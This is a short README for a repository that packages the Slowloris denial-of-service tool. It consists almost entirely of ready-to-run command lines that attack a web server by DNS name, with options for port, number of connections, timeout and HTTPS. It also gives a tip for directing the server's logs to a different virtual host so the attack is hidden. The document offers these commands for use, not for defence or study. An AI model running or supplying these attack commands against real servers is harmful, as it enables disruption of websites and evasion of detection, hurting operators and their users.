# slowloris-ddos-attack-tool
I think everyone know what is Slowloris XD

Source From https://github.com/llaera

## How To Use Slowloris
### Basic Attack
Run slowloris on command line
```perl slowloris.pl -dns example.target.com```

### Port FLooding
Run slowloris on command line
```./slowloris.pl -dns www.example.com -port 80```

### Number of Port Attack
Run slowloris on command line
```./slowloris.pl -dns www.example.com -port 80 -num 500 ```

### HTTPS Attack
Run slowloris on command line
```./slowloris.pl -dns www.example.com -port 443 -timeout 30 -num 500 -https```

There is another build in trick you might want to know. If you know that the Server is running several virtual hosts you can send the log to an other vhost than you are attacking!

```./slowloris.pl -dns www.example.com -port 80 -timeout 30 -num 500 -tcpto 1 -shost www.virtualhost.com ```

